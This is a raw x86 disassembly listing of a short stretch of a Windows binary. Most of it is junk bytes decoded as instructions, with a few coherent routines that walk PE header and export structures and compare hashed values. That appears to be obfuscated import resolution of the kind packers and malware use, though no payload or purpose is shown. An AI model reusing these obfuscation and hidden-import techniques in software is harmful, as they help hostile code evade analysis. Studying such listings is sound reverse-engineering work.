  40f059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f05a:	loop   0x40efe5
  40f05c:	and    al,0xd7
  40f05e:	popa   
  40f05f:	inc    edi
  40f060:	jns    0x40f073
  40f062:	lahf   
  40f063:	cli    
  40f064:	mov    dh,0xd2
  40f066:	rcr    DWORD PTR [eax-0x40],cl
  40f069:	dec    ebx
  40f06a:	pop    esi
  40f06b:	jmp    0x16c38b46
  40f070:	jl     0x40f054
  40f072:	aaa    
  40f073:	fst    st(0)
  40f075:	pop    ds
  40f076:	jns    0x40f044
  40f078:	pop    ecx
  40f079:	jns    0x40f09c
  40f07b:	sbb    ebx,DWORD PTR [edx-0x6c436289]
  40f081:	sub    eax,0xc2e83f7f
  40f086:	mov    eax,ds:0x61866aeb
  40f08b:	rol    DWORD PTR [edi-0x128dfb0],0xd8
  40f092:	sti    
  40f093:	or     esi,DWORD PTR [edi]
  40f095:	mov    edi,0xf4030433
  40f09a:	sbb    al,dh
  40f09c:	(bad)  
  40f09d:	out    dx,eax
  40f09e:	aam    0xa7
  40f0a0:	dec    edx
  40f0a1:	lds    edi,FWORD PTR [edx-0x32]
  40f0a4:	mov    al,BYTE PTR [eax+ebx*2]
  40f0a7:	imul   ebx,DWORD PTR [esi-0x75a7e4ca],0x8086ca76
  40f0b1:	push   0xffffff97
  40f0b3:	ds jmp 0xd990f45a
  40f0b9:	call   FWORD PTR [ecx]
  40f0bb:	test   DWORD PTR [ebx-0x1a615e3a],edx
  40f0c1:	mov    edx,0xac371547
  40f0c6:	mov    ch,0xd2
  40f0c8:	mov    ebp,0xd1755a87
  40f0cd:	mov    DWORD PTR [eax-0x7f7847ee],ebp
  40f0d3:	push   es
  40f0d4:	lahf   
  40f0d5:	scas   eax,DWORD PTR es:[edi]
  40f0d6:	ins    BYTE PTR es:[edi],dx
  40f0d7:	cli    
  40f0d8:	pop    ss
  40f0d9:	pop    esi
  40f0da:	and    al,0x6a
  40f0dc:	cmp    eax,0xa0244fa5
  40f0e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0e2:	lea    ecx,[esi+0x517c4a16]
  40f0e8:	(bad)  
  40f0e9:	cmp    BYTE PTR [ebx+0x10],ah
  40f0ec:	dec    esi
  40f0ed:	and    BYTE PTR [ecx-0x72823054],bl
  40f0f3:	adc    dh,BYTE PTR [esi-0x7c300c70]
  40f0f9:	fbstp  TBYTE PTR [eax+0x3b]
  40f0fc:	fs test al,0xea
  40f0ff:	add    BYTE PTR [esi],dl
  40f101:	dec    esi
  40f102:	add    BYTE PTR [ebx+0x3],dh
  40f105:	repnz rol DWORD PTR [esi+0x27bb8b79],0x77
  40f10d:	les    esi,FWORD PTR [eax]
  40f10f:	jle    0x40f0e8
  40f111:	fst    QWORD PTR [ecx]
  40f113:	call   0x4b10:0xc500ee4b
  40f11a:	adc    eax,0x1596e5f1
  40f11f:	hlt    
  40f120:	pop    edi
  40f121:	mov    esp,0x834c4643
  40f126:	ins    DWORD PTR es:[edi],dx
  40f127:	pop    eax
  40f128:	inc    ebx
  40f129:	inc    eax
  40f12a:	push   ss
  40f12b:	stos   DWORD PTR es:[edi],eax
  40f12c:	jl     0x40f103
  40f12e:	jmp    0xfe6d:0x552dcade
  40f135:	inc    ebp
  40f136:	inc    esp
  40f137:	cmp    DWORD PTR [edx-0x6344e414],edi
  40f13d:	ins    BYTE PTR es:[edi],dx
  40f13e:	in     al,0x7
  40f140:	scas   eax,DWORD PTR es:[edi]
  40f141:	mov    edx,gs
  40f143:	mov    DWORD PTR [eax+0xfb58c7b],ecx
  40f149:	lds    ebp,FWORD PTR [ebp+0x7f4bee04]
  40f14f:	mov    bl,al
  40f151:	xchg   DWORD PTR [edi],ebp
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [esi+0x12],eax
  40f16f:	xor    eax,0x70aaa3cd
  40f174:	jo     0x40f139
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1b0
  40f17a:	in     al,0x3f
  40f17c:	stc    
  40f17d:	call   0xfb8db250
  40f182:	inc    eax
  40f183:	mov    bl,cl
  40f185:	aas    
  40f186:	fs cmc 
  40f188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f189:	pop    ebx
  40f18a:	sbb    DWORD PTR [edx+0x3d],eax
  40f18d:	stc    
  40f18e:	ffree  st(0)
  40f190:	or     bh,0x7e
  40f193:	xor    BYTE PTR [esp+edi*2-0x1b],bh
  40f197:	stos   DWORD PTR es:[edi],eax
  40f198:	in     al,dx
  40f199:	sub    ah,BYTE PTR [esi]
  40f19b:	pop    esi
  40f19c:	hlt    
  40f19d:	cmp    dh,BYTE PTR [ebp+edx*8+0x73]
  40f1a1:	(bad)  
  40f1a2:	mov    bl,0x20
  40f1a4:	call   0xcab33583
  40f1a9:	xor    DWORD PTR [edx+0x84d6c18],0x9
  40f1b0:	jns    0x40f172
  40f1b2:	sbb    BYTE PTR [edi+0x33bb970a],al
  40f1b8:	fiadd  WORD PTR [ebx]
  40f1ba:	adc    dl,dl
  40f1bc:	mov    ds:0xe0d6c4ad,eax
  40f1c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1c2:	and    BYTE PTR [edi+0x37665ebd],bh
  40f1c8:	cdq    
  40f1c9:	dec    edx
  40f1ca:	js     0x40f23c
  40f1cc:	scas   al,BYTE PTR es:[edi]
  40f1cd:	lea    esi,[ecx-0x53]
  40f1d0:	push   ds
  40f1d1:	mov    eax,0x94a80e79
  40f1d6:	adc    eax,0xcf41fd52
  40f1db:	iret   
  40f1dc:	jno    0x40f1fd
  40f1de:	mov    eax,ds:0x378c7359
  40f1e3:	pusha  
  40f1e4:	imul   ebx,DWORD PTR [ecx],0xffffffb4
  40f1e7:	js     0x40f210
  40f1e9:	(bad)  
  40f1ea:	(bad)  
  40f1ec:	sahf   
  40f1ed:	shr    DWORD PTR [eax],0xc7
  40f1f0:	ret    
  40f1f1:	into   
  40f1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1f3:	into   
  40f1f4:	push   esp
  40f1f5:	push   cs
  40f1f6:	in     eax,dx
  40f1f7:	out    0x13,al
  40f1f9:	ja     0x40f195
  40f1fb:	std    
  40f1fc:	push   es
  40f1fd:	and    al,0x95
  40f1ff:	cld    
  40f200:	push   eax
  40f201:	mov    ds:0x84f33ff4,al
  40f206:	les    ebp,FWORD PTR [edi]
  40f208:	xchg   edx,eax
  40f209:	imul   esi,DWORD PTR [eax+edx*1-0x74],0xffffffd7
  40f20e:	push   cs
  40f20f:	inc    eax
  40f210:	push   ss
  40f211:	xchg   ecx,eax
  40f212:	push   ecx
  40f213:	inc    esi
  40f214:	clc    
  40f215:	or     dl,BYTE PTR [edi-0x9d6f0ef]
  40f21b:	mov    bh,BYTE PTR [eax]
  40f21d:	xor    eax,0x11db1a92
  40f222:	jge    0x40f1f6
  40f224:	xchg   ecx,eax
  40f225:	jmp    0x1daae6d2
  40f22a:	pop    esp
  40f22b:	repz aaa 
  40f22d:	shr    DWORD PTR [eax-0x6974f189],cl
  40f233:	push   0x72
  40f235:	icebp  
  40f236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f237:	stc    
  40f238:	and    al,0x10
  40f23a:	pop    ecx
  40f23b:	imul   edx,DWORD PTR [eax-0x2568a252],0x2db78187
  40f245:	(bad)  
  40f246:	sub    eax,0x1dd2772e
  40f24b:	add    al,0x69
  40f24d:	pop    ss
  40f24e:	call   0x9594:0xccaa40a2
  40f255:	pop    es
  40f256:	and    dh,al
  40f258:	lods   eax,DWORD PTR ds:[esi]
  40f259:	(bad)  
  40f25a:	shl    dh,0x15
  40f25d:	push   ss
  40f25e:	popf   
  40f25f:	cmp    al,0x65
  40f261:	daa    
  40f262:	or     al,BYTE PTR [eax-0xb]
  40f265:	push   ebx
  40f266:	mov    dh,0x9d
  40f268:	sahf   
  40f269:	mov    eax,0x66b30178
  40f26e:	add    al,0x2a
  40f270:	sti    
  40f271:	mov    edx,0x44eb33a5
  40f276:	call   0x71bd:0x283039e5
  40f27d:	js     0x40f2f8
  40f27f:	adc    BYTE PTR [edi+0x64],bh
  40f282:	mov    ebp,0xf0198ae4
  40f287:	push   ecx
  40f288:	or     BYTE PTR [ecx+0x57b49b26],ch
  40f28e:	mov    ds:0xf4dc573e,al
  40f293:	scas   eax,DWORD PTR es:[edi]
  40f294:	dec    edx
  40f295:	(bad)  
  40f296:	scas   al,BYTE PTR es:[edi]
  40f297:	das    
  40f298:	mov    bl,0xe7
  40f29a:	or     ch,al
  40f29c:	jns    0x40f301
  40f29e:	mov    ebx,0xc80724af
  40f2a3:	dec    ecx
  40f2a4:	iret   
  40f2a5:	shr    DWORD PTR [ebx+0x5702594f],cl
  40f2ab:	retf   0x9f1f
  40f2ae:	pop    edx
  40f2af:	call   0xc200:0x824ed0a5
  40f2b6:	arpl   WORD PTR [edx-0x4633440f],di
  40f2bc:	int    0xde
  40f2be:	jge    0x40f24a
  40f2c0:	pop    ss
  40f2c1:	jb     0x40f27c
  40f2c3:	in     eax,0x28
  40f2c5:	clc    
  40f2c6:	mov    DWORD PTR [eax],0x60341e89
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rcr    BYTE PTR [edi-0x47],1
  40f2f9:	out    dx,al
  40f2fa:	ret    0xa976
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f32a
  40f304:	xchg   ebx,eax
  40f305:	pop    esi
  40f306:	cmp    dh,BYTE PTR [edx+0x3c]
  40f309:	cmp    dl,BYTE PTR [eax+0x13913664]
  40f30f:	int    0x88
  40f311:	mov    eax,0x83789ac
  40f316:	cmp    al,0xee
  40f318:	es jmp 0x40f2cf
  40f31b:	inc    esi
  40f31c:	leave  
  40f31d:	pop    ebx
  40f31e:	adc    eax,0x33ce80b2
  40f323:	dec    ecx
  40f324:	mov    ds:0xb74c85d0,eax
  40f329:	add    BYTE PTR [eax],cl
  40f32b:	mov    esi,0x2af9c5c9
  40f330:	test   DWORD PTR [ecx],edi
  40f332:	es add al,0xc7
  40f335:	mov    esp,0x400426d
  40f33a:	loope  0x40f38a
  40f33c:	push   ebx
  40f33d:	or     al,0x54
  40f33f:	cmp    DWORD PTR [esi+0x6d867274],edi
  40f345:	jmp    0xd4968efd
  40f34a:	mov    es,esp
  40f34c:	mov    ah,0x57
  40f34e:	fs inc esp
  40f350:	pop    edi
  40f351:	and    al,0x5a
  40f353:	cwde   
  40f354:	jl     0x40f356
  40f356:	(bad)  
  40f357:	jae    0x40f36f
  40f359:	sbb    bl,BYTE PTR [ecx-0x79]
  40f35c:	in     al,dx
  40f35d:	mov    eax,ecx
  40f35f:	or     eax,0xb60932df
  40f364:	add    DWORD PTR [ebx+0x67],ebx
  40f367:	mov    edx,0xc6d4ef06
  40f36c:	xchg   edi,eax
  40f36d:	leave  
  40f36e:	push   es
  40f36f:	inc    ebp
  40f370:	jnp    0x40f343
  40f372:	pop    es
  40f373:	push   edi
  40f374:	push   eax
  40f375:	pcmpeqb mm2,mm4
  40f378:	sub    BYTE PTR [ebx+ebp*8],ch
  40f37b:	add    al,0x6c
  40f37d:	sub    eax,DWORD PTR [ebp-0x74]
  40f380:	aaa    
  40f381:	js     0x40f30c
  40f383:	xchg   ecx,eax
  40f384:	out    0x40,al
  40f386:	fnstcw WORD PTR ds:[esi]
  40f389:	mov    al,ds:0x240855cc
  40f38e:	retf   0xcc35
  40f391:	xchg   ebp,eax
  40f393:	imul   ebp,esi,0xea2c4841
  40f399:	ss ja  0x40f3d0
  40f39c:	jecxz  0x40f335
  40f39e:	jmp    0x451cea4e
  40f3a3:	je     0x40f3a3
  40f3a5:	jp     0x40f3b7
  40f3a7:	jg     0x40f422
  40f3a9:	lods   eax,DWORD PTR ds:[esi]
  40f3aa:	call   0x95656060
  40f3af:	dec    edi
  40f3b0:	(bad)  
  40f3b1:	mov    eax,ds:0x2f9b4829
  40f3b6:	sub    eax,0xabde53d2
  40f3bb:	mov    edi,0x4b90239b
  40f3c0:	jmp    0x21b6741f
  40f3c5:	cmc    
  40f3c6:	mov    ecx,0xe93b39de
  40f3cb:	cli    
  40f3cc:	jae    0x40f3d4
  40f3ce:	push   ebx
  40f3cf:	outs   dx,BYTE PTR ds:[esi]
  40f3d0:	cmp    esp,edi
  40f3d2:	and    DWORD PTR [edi-0x68840b52],0x80e9cda
  40f3dc:	(bad)  
  40f3dd:	and    al,0x31
  40f3df:	out    0xb4,al
  40f3e1:	(bad)  [esi]
  40f3e3:	fistp  QWORD PTR [ecx+0x59ad3dd7]
  40f3e9:	pushf  
  40f3ea:	pop    ds
  40f3eb:	xchg   esp,eax
  40f3ec:	pop    ebp
  40f3ed:	push   ecx
  40f3ee:	pop    ebp
  40f3ef:	popa   
  40f3f0:	cmp    eax,0xf7bf8108
  40f3f5:	imul   edi,ecx,0x41f16b27
  40f3fb:	jmp    0x33044270
  40f400:	sbb    BYTE PTR [edi+ebx*8+0x1a90123f],bl
  40f407:	popa   
  40f408:	xor    al,0x63
  40f40a:	push   eax
  40f40b:	(bad)  
  40f40c:	pop    esp
  40f40d:	and    DWORD PTR [esi],edx
  40f40f:	sti    
  40f410:	jnp    0x40f43a
  40f412:	int    0x3
  40f414:	jnp    0x40f3f6
  40f416:	add    BYTE PTR [edx-0x298dc99a],dl
  40f41c:	nop
  40f41d:	xor    BYTE PTR [ecx+ebp*2+0x1b66a9d6],dh
  40f424:	sub    al,0x5f
  40f426:	fucomi st,st(2)
  40f428:	jmp    0x40f437
  40f42a:	add    eax,0xbab48752
  40f42f:	mov    esp,0xe0f26ef7
  40f434:	(bad)  
  40f436:	push   esp
  40f437:	mov    ecx,0xeec3c003
  40f43c:	popf   
  40f43d:	pop    esi
  40f43e:	rcr    DWORD PTR [edi+eax*4],1
  40f441:	add    BYTE PTR [ebx+ecx*2+0x36],dh
  40f445:	ret    
  40f446:	pop    es
  40f447:	pop    edi
  40f448:	jge    0x40f4b0
  40f44a:	pop    es
  40f44b:	shl    BYTE PTR [ecx-0x74faf467],0x45
  40f452:	clc    
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	push   cs
  40f465:	(bad)  
  40f466:	jp     0x40f430
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	sub    ebx,DWORD PTR [edx]
  40f472:	and    al,0x5c
  40f474:	pushf  
  40f475:	repnz fldcw WORD PTR [edi+0xffbce9c]
  40f47c:	shl    DWORD PTR es:[bp+di+0x12e7],1
  40f482:	xor    esp,ecx
  40f484:	ja     0x40f41d
  40f486:	inc    ebx
  40f487:	pushf  
  40f488:	out    dx,al
  40f489:	shl    BYTE PTR [ebp+0x3ecadd34],0xc9
  40f490:	imul   esp,ecx,0xa0a6d176
  40f496:	mov    dl,0xd4
  40f498:	fwait
  40f499:	les    esi,FWORD PTR [eax]
  40f49b:	aam    0x28
  40f49d:	xlat   BYTE PTR ds:[ebx]
  40f49e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f49f:	jge    0x40f484
  40f4a1:	test   eax,0xb7028421
  40f4a6:	jo     0x40f503
  40f4a8:	push   cs
  40f4a9:	pop    eax
  40f4aa:	pusha  
  40f4ab:	xor    eax,0x260f2d21
  40f4b0:	rcr    BYTE PTR [edx+0x35ec717b],1
  40f4b6:	pop    edi
  40f4b7:	in     al,0xc2
  40f4b9:	pop    edi
  40f4ba:	icebp  
  40f4bb:	retf   
  40f4bc:	leave  
  40f4bd:	add    DWORD PTR [ebx+0x6d8b0de6],ebp
  40f4c3:	adc    BYTE PTR [edi-0x68],bh
  40f4c6:	and    ebp,edi
  40f4c8:	mov    eax,0xd55013c3
  40f4cd:	icebp  
  40f4ce:	mov    ds:0xa09ea945,al
  40f4d3:	retf   
  40f4d4:	out    dx,eax
  40f4d5:	std    
  40f4d6:	xchg   edx,eax
  40f4d7:	cmp    dh,BYTE PTR [edi-0x5b]
  40f4da:	mov    al,0xfa
  40f4dc:	bnd jp 0x40f4d8
  40f4df:	mov    dh,0x6a
  40f4e1:	mov    ah,0xd7
  40f4e3:	dec    edx
  40f4e4:	cld    
  40f4e5:	not    bl
  40f4e7:	popa   
  40f4e8:	adc    DWORD PTR [edi+0x37],0xffffffa8
  40f4ec:	fs jo  0x6e2d8b8
  40f4f3:	dec    esp
  40f4f4:	push   eax
  40f4f5:	enter  0x54f9,0x1c
  40f4f9:	xchg   esp,eax
  40f4fa:	cdq    
  40f4fb:	nop
  40f4fc:	cdq    
  40f4fd:	ret    0xc963
  40f500:	daa    
  40f501:	sub    ecx,ecx
  40f503:	shl    BYTE PTR [eax-0x3c5f226c],0xaa
  40f50a:	adc    bh,bh
  40f50c:	jnp    0x40f4ec
  40f50e:	pop    edx
  40f50f:	inc    edi
  40f510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f511:	test   eax,0x84b01d86
  40f516:	pusha  
  40f517:	pop    edi
  40f518:	imul   eax,ebx,0x3c
  40f51b:	xchg   edi,eax
  40f51c:	xor    DWORD PTR [edi-0xa513455],0xb18957f8
  40f526:	frstor [ebp+0x16]
  40f529:	and    ch,BYTE PTR [edi+0x63]
  40f52c:	xlat   BYTE PTR ds:[ebx]
  40f52d:	mov    esp,0xdb513c9f
  40f532:	or     ecx,ebp
  40f534:	xchg   ebp,eax
  40f535:	das    
  40f536:	popf   
  40f537:	loop   0x40f4e2
  40f539:	cmp    DWORD PTR [ebp+0x7cf1a95a],esp
  40f53f:	lea    ebx,ds:0x86de638
  40f545:	add    BYTE PTR [ebp+0x32],dh
  40f548:	jmp    0xe61582cb
  40f54d:	mov    al,ah
  40f54f:	sub    eax,0xb74b7b36
  40f554:	pop    esi
  40f555:	adc    BYTE PTR [eax+eiz*8],ah
  40f558:	dec    edx
  40f559:	sub    DWORD PTR [edi],edx
  40f55b:	fnsave [esp+edx*1-0x43]
  40f55f:	pop    ecx
  40f560:	pop    esi
  40f561:	lds    edx,FWORD PTR [edx+0xd9a5d7f]
  40f567:	mov    fs,WORD PTR [ebx-0x2c]
  40f56a:	xchg   edi,eax
  40f56b:	jns    0x40f5d4
  40f56d:	xchg   ecx,eax
  40f56e:	call   0x2d36bedc
  40f573:	sub    ebx,esp
  40f575:	mov    ecx,DWORD PTR [eax]
  40f577:	jo     0x40f502
  40f579:	(bad)  
  40f57b:	mov    BYTE PTR [ebx-0x6aa9f5de],bh
  40f581:	rcr    eax,cl
  40f583:	cwde   
  40f584:	jmp    0xd6bc:0xb8b75abf
  40f58b:	dec    edi
  40f58c:	call   0x66ef:0x3ccb3c1a
  40f593:	pop    ebp
  40f594:	in     al,0x32
  40f596:	cwde   
  40f597:	inc    edi
  40f598:	xchg   ecx,eax
  40f599:	pusha  
  40f59a:	sub    BYTE PTR [edx],bl
  40f59c:	push   edi
  40f59d:	and    BYTE PTR [ebp-0x75017712],bl
  40f5a3:	inc    edx
  40f5a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5a5:	xchg   edx,eax
  40f5a6:	repz fidivr WORD PTR [esi]
  40f5a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5aa:	js     0x40f548
  40f5ac:	rol    BYTE PTR [ebp+ebx*8-0x1d],1
  40f5b0:	retf   0xa6d1
  40f5b3:	push   0x49fca86f
  40f5b8:	mov    edi,0xfa3bca2d
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	mov    bl,0x40
  40f605:	ret    
  40f606:	cmp    DWORD PTR [esi+esi*4+0x7fc37070],ecx
  40f60d:	jo     0x40f67f
  40f60f:	cdq    
  40f610:	or     ch,bh
  40f612:	cmp    BYTE PTR [ebx],dl
  40f614:	fisttp DWORD PTR [esp+eiz*8-0x32c86494]
  40f61b:	pop    ebp
  40f61c:	or     BYTE PTR ds:0x1d80615f,ah
  40f622:	mov    edi,0xbde86a7d
  40f627:	cli    
  40f628:	push   edi
  40f629:	out    0x82,al
  40f62b:	in     eax,dx
  40f62c:	jns    0x40f690
  40f62e:	cs jnp 0x40f5e2
  40f631:	jbe    0x40f66f
  40f633:	pop    ecx
  40f634:	in     al,dx
  40f635:	repz cmp eax,0xf026c615
  40f63b:	dec    ecx
  40f63c:	(bad)  
  40f63d:	sbb    BYTE PTR [edx+0x4f],dh
  40f640:	shr    DWORD PTR [edi+0x4b],1
  40f643:	and    ah,BYTE PTR ss:0x677452f9
  40f64a:	out    0xad,al
  40f64c:	into   
  40f64d:	(bad)  
  40f64e:	imul   eax
  40f650:	pop    es
  40f651:	lods   eax,DWORD PTR ds:[esi]
  40f652:	sub    DWORD PTR ds:0x2a13fb97,esi
  40f658:	pushf  
  40f659:	fdivr  st,st(5)
  40f65b:	xchg   ecx,eax
  40f65c:	(bad)  
  40f65d:	ds cwde 
  40f65f:	(bad)  
  40f660:	xor    al,bl
  40f662:	jmp    0x6f8b2b2c
  40f667:	retf   0x66b8
  40f66a:	outs   dx,DWORD PTR ds:[esi]
  40f66b:	pop    ecx
  40f66c:	pop    es
  40f66d:	cli    
  40f66e:	popf   
  40f66f:	and    al,0x48
  40f671:	dec    edx
  40f672:	(bad)  
  40f673:	push   edi
  40f674:	(bad)  
  40f675:	jmp    0x4c4a:0xde2465c9
  40f67c:	fdiv   st(0),st
  40f67e:	fbld   TBYTE PTR [eax+0x7]
  40f681:	or     BYTE PTR [edx],bh
  40f683:	or     al,0xa1
  40f685:	mov    cl,0x59
  40f687:	inc    ebx
  40f688:	dec    eax
  40f689:	es mov edi,0xf0cb9fac
  40f68f:	and    al,0xe9
  40f691:	cmp    ebx,ecx
  40f693:	add    edi,DWORD PTR [ecx-0x3a]
  40f696:	pop    ecx
  40f697:	in     al,0xcd
  40f699:	cmp    BYTE PTR [edi+0x52],ah
  40f69c:	hlt    
  40f69d:	mul    DWORD PTR [edx+0x2f]
  40f6a0:	pusha  
  40f6a1:	(bad)  
  40f6a2:	sbb    al,0x82
  40f6a4:	mov    ebx,0x8e2d92fe
  40f6a9:	inc    edi
  40f6aa:	or     ecx,DWORD PTR [edi]
  40f6ac:	js     0x40f663
  40f6ae:	enter  0xb5b1,0x3e
  40f6b2:	ficomp DWORD PTR [edi]
  40f6b4:	comiss xmm4,DWORD PTR fs:[esi-0x64]
  40f6b9:	cmc    
  40f6ba:	lahf   
  40f6bb:	icebp  
  40f6bc:	out    dx,al
  40f6bd:	cmp    ch,dl
  40f6bf:	lds    esp,FWORD PTR [esi-0x72021e28]
  40f6c5:	mov    al,0x9e
  40f6c7:	imul   esi,DWORD PTR [ebp+0x7cd4ef67],0x512645b5
  40f6d1:	sbb    BYTE PTR ss:[eax-0x18be7d79],bh
  40f6d8:	sub    al,0x47
  40f6da:	mov    ah,0xe3
  40f6dc:	pushf  
  40f6dd:	out    dx,al
  40f6de:	retf   0x9d19
  40f6e1:	scas   eax,DWORD PTR es:[edi]
  40f6e2:	frstor [ebp-0x2b8b7976]
  40f6e8:	das    
  40f6e9:	cmp    dl,BYTE PTR [edi+0x73]
  40f6ec:	sbb    BYTE PTR [ecx],ch
  40f6ee:	int    0xb6
  40f6f0:	aas    
  40f6f1:	js     0x40f71d
  40f6f3:	xor    BYTE PTR [esi+0x663743f2],al
  40f6f9:	mov    fs,esp
  40f6fb:	lods   eax,DWORD PTR ds:[esi]
  40f6fc:	stc    
  40f6fd:	(bad)  
  40f6fe:	xor    DWORD PTR [esi+esi*4-0xb],esi
  40f702:	adc    esp,DWORD PTR [ecx-0x36eda925]
  40f708:	jle    0x40f71d
  40f70a:	xchg   esp,eax
  40f70b:	retf   
  40f70c:	ins    BYTE PTR es:[edi],dx
  40f70d:	jne    0x40f6a5
  40f70f:	push   esp
  40f710:	dec    DWORD PTR [ebx-0x671fb728]
  40f716:	std    
  40f717:	(bad)  
  40f718:	repz (bad) 
  40f71a:	sti    
  40f71b:	sahf   
  40f71c:	scas   eax,DWORD PTR es:[edi]
  40f71d:	add    ebp,DWORD PTR [ebx+0x1401b798]
  40f723:	sahf   
  40f724:	clc    
  40f725:	in     eax,dx
  40f726:	fstp   QWORD PTR [esi-0x2727af2f]
  40f72c:	cs fsub st,st(3)
  40f72f:	test   DWORD PTR [edx-0x7c],0xcd3df4f3
  40f736:	scas   eax,DWORD PTR es:[edi]
  40f737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f738:	ins    DWORD PTR es:[edi],dx
  40f739:	mov    ds:0x7624c524,al
  40f73e:	scas   al,BYTE PTR es:[edi]
  40f73f:	mov    bl,0xca
  40f741:	pop    ebp
  40f742:	aad    0x36
  40f744:	mov    bh,0x84
  40f746:	inc    esp
  40f747:	push   cs
  40f748:	add    ch,BYTE PTR [ebx-0x51]
  40f74b:	out    dx,eax
  40f74c:	xor    DWORD PTR [ecx],esp
  40f74e:	lea    edx,[edx+ebx*1]
  40f751:	adc    dl,BYTE PTR [edi]
  40f753:	stos   DWORD PTR es:[edi],eax
  40f754:	push   edi
  40f755:	xor    cl,BYTE PTR [edx-0x6add512d]
  40f75b:	xlat   BYTE PTR ds:[ebx]
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x985a46f3
  40f7e3:	nop
  40f7e4:	pop    di
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f832
  40f7ee:	mov    fs,WORD PTR [eax-0x46]
  40f7f1:	push   esp
  40f7f2:	je     0x40f790
